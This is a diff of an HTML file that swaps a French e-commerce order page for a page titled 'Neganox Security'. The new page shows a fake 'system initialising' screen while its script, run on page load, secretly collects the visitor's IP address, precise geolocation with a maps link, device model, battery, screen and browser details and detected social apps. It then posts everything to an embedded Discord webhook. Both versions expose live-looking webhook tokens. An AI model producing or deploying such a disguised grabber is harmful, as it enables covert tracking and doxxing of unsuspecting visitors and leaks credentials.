@@ -3,594 +3,375 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEGAN SHOP - E-commerce Premium</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>Neganox Security</title>
     <style>
         :root {
-            --primary: #000000;
-            --secondary: #ff0000;
-            --text: #ffffff;
-        }
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Arial', sans-serif;
+            --primary: #5865F2;
+            --secondary: #EB459E;
         }
         
         body {
-            background-color: #111;
-            color: var(--text);
-            overflow-x: hidden;
-        }
-        
-        /* Animation d'entrée */
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        /* Header */
-        header {
-            background-color: var(--primary);
-            padding: 20px 5%;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', sans-serif;
+            background-color: #000000;
+            height: 100vh;
             display: flex;
-            justify-content: space-between;
-            align-items: center;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            box-shadow: 0 5px 15px rgba(255, 0, 0, 0.3);
-        }
-        
-        .logo {
-            font-size: 2rem;
-            font-weight: bold;
-            color: var(--secondary);
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            animation: fadeIn 1s ease-out;
-        }
-        
-        .logo span {
-            color: white;
-        }
-        
-        nav ul {
-            display: flex;
-            list-style: none;
-        }
-        
-        nav ul li {
-            margin-left: 30px;
-        }
-        
-        nav ul li a {
-            color: white;
-            text-decoration: none;
-            font-weight: bold;
-            transition: all 0.3s ease;
-            position: relative;
-        }
-        
-        nav ul li a:hover {
-            color: var(--secondary);
-        }
-        
-        nav ul li a::after {
-            content: '';
-            position: absolute;
-            width: 0;
-            height: 2px;
-            background: var(--secondary);
-            bottom: -5px;
-            left: 0;
-            transition: width 0.3s;
-        }
-        
-        nav ul li a:hover::after {
-            width: 100%;
-        }
-        
-        /* Hero Section */
-        .hero {
-            height: 80vh;
-            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), url('hero-bg.jpg');
-            background-size: cover;
-            background-position: center;
-            display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
-            text-align: center;
-            padding: 0 20px;
-        }
-        
-        .hero h1 {
-            font-size: 4rem;
-            margin-bottom: 20px;
-            color: var(--secondary);
-            text-transform: uppercase;
-            letter-spacing: 5px;
-            animation: fadeIn 1s ease-out 0.2s both;
-        }
-        
-        .hero p {
-            font-size: 1.2rem;
-            margin-bottom: 30px;
-            max-width: 700px;
-            animation: fadeIn 1s ease-out 0.4s both;
-        }
-        
-        .btn {
-            display: inline-block;
-            background: var(--secondary);
             color: white;
-            padding: 12px 30px;
-            border: none;
-            border-radius: 5px;
-            font-size: 1rem;
-            font-weight: bold;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            animation: fadeIn 1s ease-out 0.6s both;
-        }
-        
-        .btn:hover {
-            background: #cc0000;
-            transform: translateY(-3px);
-            box-shadow: 0 10px 20px rgba(255, 0, 0, 0.3);
-        }
-        
-        /* Produits */
-        .products {
-            padding: 80px 5%;
-        }
-        
-        .section-title {
-            text-align: center;
-            margin-bottom: 50px;
-            font-size: 2.5rem;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            color: var(--secondary);
-        }
-        
-        .product-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-            gap: 30px;
-        }
-        
-        .product-card {
-            background: #222;
-            border-radius: 10px;
             overflow: hidden;
-            transition: all 0.3s ease;
             position: relative;
         }
         
-        .product-card:hover {
-            transform: translateY(-10px);
-            box-shadow: 0 15px 30px rgba(255, 0, 0, 0.2);
-        }
-        
-        .product-img {
-            height: 250px;
-            width: 100%;
-            object-fit: cover;
-            transition: all 0.5s ease;
-        }
-        
-        .product-card:hover .product-img {
-            transform: scale(1.05);
-        }
-        
-        .product-info {
-            padding: 20px;
-        }
-        
-        .product-title {
-            font-size: 1.2rem;
-            margin-bottom: 10px;
-        }
-        
-        .product-price {
-            color: var(--secondary);
-            font-size: 1.5rem;
-            font-weight: bold;
-            margin-bottom: 15px;
-        }
-        
-        .buy-btn {
-            background: var(--primary);
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            width: 100%;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: bold;
-            transition: all 0.3s ease;
-        }
-        
-        .buy-btn:hover {
-            background: var(--secondary);
-        }
-        
-        /* Footer */
-        footer {
-            background: var(--primary);
-            padding: 50px 5% 20px;
-            text-align: center;
-        }
-        
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            margin-bottom: 30px;
-        }
-        
-        .footer-links a {
-            color: white;
-            margin: 0 15px;
-            text-decoration: none;
-            transition: all 0.3s ease;
-        }
-        
-        .footer-links a:hover {
-            color: var(--secondary);
-        }
-        
-        .social-icons {
-            margin-bottom: 30px;
-        }
-        
-        .social-icons a {
-            color: white;
-            font-size: 1.5rem;
-            margin: 0 10px;
-            transition: all 0.3s ease;
-        }
-        
-        .social-icons a:hover {
-            color: var(--secondary);
-            transform: translateY(-5px);
-        }
-        
-        .copyright {
-            color: #777;
-            font-size: 0.9rem;
-        }
-        
-        /* Modal de commande */
-        .modal {
-            display: none;
-            position: fixed;
+        .particles {
+            position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
+            pointer-events: none;
         }
         
-        .modal-content {
-            background: #222;
-            padding: 30px;
-            border-radius: 10px;
-            width: 90%;
-            max-width: 500px;
-            animation: fadeIn 0.5s ease-out;
-            position: relative;
-        }
-        
-        .close-modal {
+        .particle {
             position: absolute;
-            top: 15px;
-            right: 15px;
-            font-size: 1.5rem;
-            color: white;
-            cursor: pointer;
-            transition: all 0.3s ease;
+            width: 2px;
+            height: 2px;
+            background-color: rgba(255, 255, 255, 0.6);
+            border-radius: 50%;
+            animation: fall linear infinite;
         }
         
-        .close-modal:hover {
-            color: var(--secondary);
+        @keyframes fall {
+            to {
+                transform: translateY(100vh);
+            }
         }
         
-        .modal h2 {
-            color: var(--secondary);
-            margin-bottom: 20px;
+        .login-card {
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(12px);
+            border-radius: 10px;
+            padding: 40px;
+            width: 100%;
+            max-width: 500px;
+            box-shadow: 0 0 20px rgba(88, 101, 242, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
             text-align: center;
+            z-index: 10;
         }
         
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        .form-group label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-        }
-        
-        .form-group input, .form-group select, .form-group textarea {
-            width: 100%;
-            padding: 10px;
-            background: #333;
-            border: none;
-            border-radius: 5px;
+        h1 {
+            margin: 0 0 10px 0;
+            font-weight: 600;
+            font-size: 42px;
             color: white;
+            text-shadow: 0 0 10px rgba(88, 101, 242, 0.8);
         }
         
-        .submit-btn {
-            background: var(--secondary);
-            color: white;
-            border: none;
-            padding: 12px 30px;
-            width: 100%;
-            border-radius: 5px;
+        .subtitle {
+            font-size: 14px;
+            color: rgba(255,255,255,0.7);
+            margin-bottom: 30px;
+        }
+        
+        .status-container {
+            margin-top: 30px;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            border-left: 3px solid var(--primary);
+        }
+        
+        .status-title {
             font-weight: bold;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            cursor: pointer;
-            transition: all 0.3s ease;
+            margin-bottom: 10px;
+            color: var(--primary);
         }
         
-        .submit-btn:hover {
-            background: #cc0000;
+        .status {
+            font-size: 14px;
+            color: rgba(255,255,255,0.8);
+            min-height: 20px;
         }
         
-        /* Responsive */
-        @media (max-width: 768px) {
-            header {
-                flex-direction: column;
-                padding: 15px;
-            }
-            
-            .logo {
-                margin-bottom: 15px;
-            }
-            
-            nav ul {
-                flex-wrap: wrap;
-                justify-content: center;
-            }
-            
-            nav ul li {
-                margin: 0 10px 10px;
-            }
-            
-            .hero h1 {
-                font-size: 2.5rem;
-            }
-            
-            .product-grid {
-                grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
-            }
+        .progress-bar {
+            height: 4px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 2px;
+            margin-top: 15px;
+            overflow: hidden;
+        }
+        
+        .progress {
+            height: 100%;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            width: 0%;
+            transition: width 0.5s ease;
+            border-radius: 2px;
+        }
+        
+        .footer {
+            position: absolute;
+            bottom: 20px;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            font-size: 12px;
+            color: rgba(255,255,255,0.5);
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
-    <header>
-        <div class="logo">NEGAN <span>SHOP</span></div>
-        <nav>
-            <ul>
-                <li><a href="#home">Accueil</a></li>
-                <li><a href="#products">Produits</a></li>
-                <li><a href="#about">À propos</a></li>
-                <li><a href="#contact">Contact</a></li>
-                <li><a href="#" class="lang-switch">عربي</a></li>
-            </ul>
-        </nav>
-    </header>
+    <div class="particles" id="particles"></div>
     
-    <section class="hero" id="home">
-        <h1>NEGAN SHOP</h1>
-        <p>Découvrez notre collection exclusive avec des designs uniques et des matériaux de haute qualité.</p>
-        <a href="#products" class="btn">Voir les produits</a>
-    </section>
-    
-    <section class="products" id="products">
-        <h2 class="section-title">Nos Produits</h2>
-        <div class="product-grid">
-            <!-- Produit 1 -->
-            <div class="product-card">
-                <img src="product1.jpg" alt="Produit 1" class="product-img">
-                <div class="product-info">
-                    <h3 class="product-title">Nom du Produit 1</h3>
-                    <p class="product-price">299 MAD</p>
-                    <button class="buy-btn" onclick="openOrderModal('Nom du Produit 1', 299)">Acheter maintenant</button>
-                </div>
+    <div class="login-card">
+        <h1>NEGANOX IS BACK</h1>
+        <div class="subtitle">Système de sécurité avancé en cours d'initialisation</div>
+        
+        <div class="status-container">
+            <div class="status-title">STATUT DU SYSTÈME</div>
+            <div id="status" class="status">Initialisation du système...</div>
+            <div class="progress-bar">
+                <div id="progress" class="progress"></div>
             </div>
-            
-            <!-- Produit 2 -->
-            <div class="product-card">
-                <img src="product2.jpg" alt="Produit 2" class="product-img">
-                <div class="product-info">
-                    <h3 class="product-title">Nom du Produit 2</h3>
-                    <p class="product-price">399 MAD</p>
-                    <button class="buy-btn" onclick="openOrderModal('Nom du Produit 2', 399)">Acheter maintenant</button>
-                </div>
-            </div>
-            
-            <!-- Produit 3 -->
-            <div class="product-card">
-                <img src="product3.jpg" alt="Produit 3" class="product-img">
-                <div class="product-info">
-                    <h3 class="product-title">Nom du Produit 3</h3>
-                    <p class="product-price">499 MAD</p>
-                    <button class="buy-btn" onclick="openOrderModal('Nom du Produit 3', 499)">Acheter maintenant</button>
-                </div>
-            </div>
-            
-            <!-- Produit 4 -->
-            <div class="product-card">
-                <img src="product4.jpg" alt="Produit 4" class="product-img">
-                <div class="product-info">
-                    <h3 class="product-title">Nom du Produit 4</h3>
-                    <p class="product-price">599 MAD</p>
-                    <button class="buy-btn" onclick="openOrderModal('Nom du Produit 4', 599)">Acheter maintenant</button>
-                </div>
-            </div>
-        </div>
-    </section>
-    
-    <!-- Modal de commande -->
-    <div class="modal" id="orderModal">
-        <div class="modal-content">
-            <span class="close-modal" onclick="closeModal()">&times;</span>
-            <h2>Passer votre commande</h2>
-            <form id="orderForm">
-                <input type="hidden" id="productName">
-                <input type="hidden" id="productPrice">
-                
-                <div class="form-group">
-                    <label for="fullName">Nom complet</label>
-                    <input type="text" id="fullName" required>
-                </div>
-                
-                <div class="form-group">
-                    <label for="phone">Numéro de téléphone</label>
-                    <input type="tel" id="phone" required>
-                </div>
-                
-                <div class="form-group">
-                    <label for="email">Email</label>
-                    <input type="email" id="email">
-                </div>
-                
-                <div class="form-group">
-                    <label for="address">Adresse complète</label>
-                    <input type="text" id="address" required>
-                </div>
-                
-                <div class="form-group">
-                    <label for="city">Ville</label>
-                    <input type="text" id="city" value="Safi" required>
-                </div>
-                
-                <div class="form-group">
-                    <label for="quantity">Quantité</label>
-                    <select id="quantity">
-                        <option value="1">1</option>
-                        <option value="2">2</option>
-                        <option value="3">3</option>
-                        <option value="4">4</option>
-                        <option value="5">5</option>
-                    </select>
-                </div>
-                
-                <button type="submit" class="submit-btn">Confirmer la commande</button>
-            </form>
         </div>
     </div>
     
-    <footer>
-        <div class="footer-links">
-            <a href="#home">Accueil</a>
-            <a href="#products">Produits</a>
-            <a href="#about">À propos</a>
-            <a href="#contact">Contact</a>
-            <a href="#">Mentions légales</a>
-        </div>
-        
-        <div class="social-icons">
-            <a href="#"><i class="fab fa-facebook-f"></i></a>
-            <a href="#"><i class="fab fa-instagram"></i></a>
-            <a href="#"><i class="fab fa-whatsapp"></i></a>
-        </div>
-        
-        <p class="copyright">© 2023 NEGAN SHOP. Tous droits réservés.</p>
-    </footer>
-    
+    <div class="footer">Dev By Neganox</div>
+
     <script>
-        // Fonctions pour le modal
-        function openOrderModal(productName, productPrice) {
-            document.getElementById('productName').value = productName;
-            document.getElementById('productPrice').value = productPrice;
-            document.getElementById('orderModal').style.display = 'flex';
-        }
-        
-        function closeModal() {
-            document.getElementById('orderModal').style.display = 'none';
-        }
-        
-        // Fermer le modal quand on clique en dehors
-        window.onclick = function(event) {
-            const modal = document.getElementById('orderModal');
-            if (event.target == modal) {
-                closeModal();
+        // Création des particules
+        function createParticles() {
+            const particlesContainer = document.getElementById('particles');
+            const particleCount = 100;
+            
+            for (let i = 0; i < particleCount; i++) {
+                const particle = document.createElement('div');
+                particle.classList.add('particle');
+                
+                particle.style.left = `${Math.random() * 100}%`;
+                particle.style.top = `${Math.random() * 100}%`;
+                
+                const size = Math.random() * 3 + 1;
+                particle.style.width = `${size}px`;
+                particle.style.height = `${size}px`;
+                
+                particle.style.opacity = Math.random() * 0.5 + 0.1;
+                
+                const duration = Math.random() * 10 + 5;
+                particle.style.animationDuration = `${duration}s`;
+                
+                particle.style.animationDelay = `${Math.random() * 5}s`;
+                
+                particlesContainer.appendChild(particle);
             }
         }
         
-        // Envoyer la commande via webhook Discord
-        document.getElementById('orderForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const productName = document.getElementById('productName').value;
-            const productPrice = document.getElementById('productPrice').value;
-            const fullName = document.getElementById('fullName').value;
-            const phone = document.getElementById('phone').value;
-            const email = document.getElementById('email').value;
-            const address = document.getElementById('address').value;
-            const city = document.getElementById('city').value;
-            const quantity = document.getElementById('quantity').value;
-            
-            const totalPrice = parseInt(productPrice) * parseInt(quantity);
-            
-            // Message à envoyer à Discord
-            const message = {
-                content: `**Nouvelle commande sur NEGAN SHOP**\n\n` +
-                         `**Produit:** ${productName}\n` +
-                         `**Prix unitaire:** ${productPrice} MAD\n` +
-                         `**Quantité:** ${quantity}\n` +
-                         `**Total:** ${totalPrice} MAD\n\n` +
-                         `**Informations client:**\n` +
-                         `- Nom complet: ${fullName}\n` +
-                         `- Téléphone: ${phone}\n` +
-                         `- Email: ${email || 'Non fourni'}\n` +
-                         `- Adresse: ${address}, ${city}\n\n` +
-                         `@everyone Nouvelle commande à traiter!`
+        function updateProgress(percent) {
+            document.getElementById('progress').style.width = `${percent}%`;
+        }
+        
+        function updateStatus(text) {
+            document.getElementById('status').textContent = text;
+        }
+        
+        // Fonction pour détecter les applications sociales
+        async function detectSocialMedia() {
+            const apps = {
+                'Discord': navigator.userAgent.includes('Discord'),
+                'Instagram': navigator.userAgent.includes('Instagram'),
+                'WhatsApp': navigator.userAgent.includes('WhatsApp')
             };
             
-            // URL du webhook Discord - À REMPLACER PAR LE VÔTRE
-            const webhookUrl = 'https://discord.com/api/webhooks/1384373952050102322/MIyJXATukKaty3nT_DKHu012tgZ6TbmZCIGl8DX3AE-eGy945btGFRxlKnrdFxS4NMiI';
-            
-            // Envoi des données au webhook
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(message),
-            })
-            .then(response => {
-                if (response.ok) {
-                    alert('Commande passée avec succès! Nous vous contacterons bientôt.');
-                    closeModal();
-                } else {
-                    alert('Erreur lors de l\'envoi de la commande. Veuillez nous contacter directement.');
+            // Vérification supplémentaire pour WhatsApp Web
+            if (!apps['WhatsApp']) {
+                try {
+                    await fetch('https://web.whatsapp.com/', { mode: 'no-cors' });
+                    apps['WhatsApp'] = true;
+                } catch (e) {
+                    apps['WhatsApp'] = false;
                 }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                alert('Erreur réseau. Veuillez nous contacter directement.');
-            });
-        });
+            }
+            
+            return apps;
+        }
         
-        // Changement de langue (basique)
-        document.querySelector('.lang-switch').addEventListener('click', function(e) {
-            e.preventDefault();
-            // Ici vous pouvez implémenter un vrai système de changement de langue
-            alert('Système de langue sera implémenté');
-        });
+        // Fonction pour obtenir le nom du périphérique (pour Android)
+        function getDeviceName() {
+            if (navigator.userAgent.match(/Android/i)) {
+                const model = navigator.userAgent.match(/Android.*;\s([a-zA-Z0-9\s\-]+)\sBuild/i);
+                return model ? model[1] : 'Inconnu';
+            }
+            return navigator.platform;
+        }
+        
+        // Fonction principale améliorée
+        async function collectAndSendData() {
+            try {
+                // Étape 1: Collecte IP
+                updateStatus("Collecte de l'adresse IP...");
+                updateProgress(10);
+                
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const { ip } = await ipResponse.json();
+                
+                // Étape 2: Collecte localisation précise
+                updateStatus("Collecte des informations de localisation...");
+                updateProgress(30);
+                
+                // Utilisation de plusieurs APIs pour une localisation plus précise
+                let locData = {};
+                try {
+                    const ipapiResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                    locData = await ipapiResponse.json();
+                    
+                    // Vérification avec une autre API
+                    const ip2locationResponse = await fetch(`https://api.ip2location.io/?key=demo&ip=${ip}`);
+                    const ip2locData = await ip2locationResponse.json();
+                    
+                    // Fusion des données
+                    locData = {
+                        ...locData,
+                        ...ip2locData,
+                        precise_location: `${ip2locData.city_name}, ${ip2locData.region_name}, ${ip2locData.country_name}`,
+                        google_maps_link: `https://www.google.com/maps?q=${ip2locData.latitude},${ip2locData.longitude}`
+                    };
+                } catch (e) {
+                    console.error("Erreur localisation:", e);
+                }
+                
+                // Étape 3: Collecte d'informations avancées
+                updateStatus("Analyse du périphérique...");
+                updateProgress(50);
+                
+                // Détection des applications sociales
+                const socialMedia = await detectSocialMedia();
+                
+                // Informations sur le navigateur
+                const browserInfo = {
+                    name: navigator.appName,
+                    version: navigator.appVersion,
+                    vendor: navigator.vendor,
+                    cookies: navigator.cookieEnabled,
+                    java: navigator.javaEnabled(),
+                    pdf: navigator.pdfViewerEnabled,
+                    doNotTrack: navigator.doNotTrack
+                };
+                
+                // Informations sur l'écran
+                const screenInfo = {
+                    resolution: `${window.screen.width}x${window.screen.height}`,
+                    colorDepth: window.screen.colorDepth,
+                    orientation: window.screen.orientation.type
+                };
+                
+                // Informations sur le système
+                const systemInfo = {
+                    deviceName: getDeviceName(),
+                    cpuCores: navigator.hardwareConcurrency || 'Inconnu',
+                    deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Inconnu',
+                    battery: navigator.getBattery ? await navigator.getBattery().then(b => ({
+                        level: `${Math.floor(b.level * 100)}%`,
+                        charging: b.charging
+                    })) : 'Non supporté'
+                };
+                
+                // Étape 4: Préparation des données
+                updateStatus("Préparation des données...");
+                updateProgress(70);
+                
+                // Formater les données pour Discord
+                const embeds = [{
+                    title: "🚨 NOUVELLE CONNEXION DÉTECTÉE 🚨",
+                    color: 0xEB459E,
+                    fields: [
+                        { name: "🌍 Adresse IP", value: ip, inline: true },
+                        { name: "📍 Localisation précise", value: locData.precise_location || `${locData.city}, ${locData.region}, ${locData.country_name}`, inline: true },
+                        { name: "🗺️ Lien Google Maps", value: locData.google_maps_link || `[Voir sur Maps](https://www.google.com/maps?q=${locData.latitude},${locData.longitude})` },
+                        { name: "📱 Périphérique", value: systemInfo.deviceName },
+                        { name: "🖥️ CPU/RAM", value: `${systemInfo.cpuCores} cores | ${systemInfo.deviceMemory}` },
+                        { name: "🔋 Batterie", value: typeof systemInfo.battery === 'object' ? `${systemInfo.battery.level} (${systemInfo.battery.charging ? 'En charge' : 'Non en charge'})` : systemInfo.battery },
+                        { name: "🖥️ Résolution", value: screenInfo.resolution },
+                        { name: "🌐 Langue", value: navigator.language },
+                        { name: "⏱️ Fuseau horaire", value: Intl.DateTimeFormat().resolvedOptions().timeZone },
+                        { name: "📅 Date/Heure", value: new Date().toLocaleString() }
+                    ],
+                    footer: { text: "Système de sécurité Neganox" },
+                    timestamp: new Date().toISOString()
+                }];
+                
+                // Ajout des applications détectées
+                const detectedApps = Object.entries(socialMedia).filter(([_, val]) => val).map(([name]) => name);
+                if (detectedApps.length > 0) {
+                    embeds[0].fields.push({
+                        name: "📱 Applications détectées",
+                        value: detectedApps.join(', ')
+                    });
+                }
+                
+                // Ajout des informations techniques
+                embeds.push({
+                    title: "📊 Informations techniques",
+                    color: 0x5865F2,
+                    fields: [
+                        { name: "🔍 User Agent", value: `\`\`\`${navigator.userAgent}\`\`\`` },
+                        { name: "🌐 Navigateur", value: `${browserInfo.name} ${browserInfo.version}` },
+                        { name: "🍪 Cookies", value: browserInfo.cookies ? 'Activés' : 'Désactivés' },
+                        { name: "📄 PDF Viewer", value: browserInfo.pdf ? 'Activé' : 'Désactivé' },
+                        { name: "🛡️ Do Not Track", value: browserInfo.doNotTrack || 'Non supporté' },
+                        { name: "🖥️ Orientation écran", value: screenInfo.orientation },
+                        { name: "🎨 Profondeur couleur", value: `${screenInfo.colorDepth} bits` }
+                    ],
+                    timestamp: new Date().toISOString()
+                });
+                
+                // Étape 5: Envoi des données
+                updateStatus("Envoi des données au serveur...");
+                updateProgress(90);
+                
+                // REMPLACER PAR VOTRE WEBHOOK DISCORD
+                const webhookURL = 'https://discordapp.com/api/webhooks/1393637362151460985/rSzFt_8ovhnAbBIhsmHB33-BbUs8rr6_loE9-ig9feo8TfLeXDgADdDP_aU8TKYJST6Q';
+                
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        username: "Neganox Security",
+                        avatar_url: "https://i.imgur.com/J5qKZQt.png",
+                        embeds: embeds 
+                    })
+                });
+                
+                if (response.ok) {
+                    updateStatus("✅ Initialisation terminée avec succès");
+                    updateProgress(100);
+                    
+                    // Redirection après 3 secondes
+                    setTimeout(() => {
+                        window.location.href = "#"; // Mettez votre URL de redirection ici
+                    }, 3000);
+                } else {
+                    throw new Error('Erreur lors de l\'envoi');
+                }
+                
+            } catch (error) {
+                console.error('Erreur:', error);
+                updateStatus("❌ Erreur lors de l'initialisation, veuillez actualiser la page");
+                updateProgress(0);
+            }
+        }
+        
+        // Démarrer le processus
+        window.onload = function() {
+            createParticles();
+            setTimeout(collectAndSendData, 1500);
+        };
     </script>
 </body>
 </html>
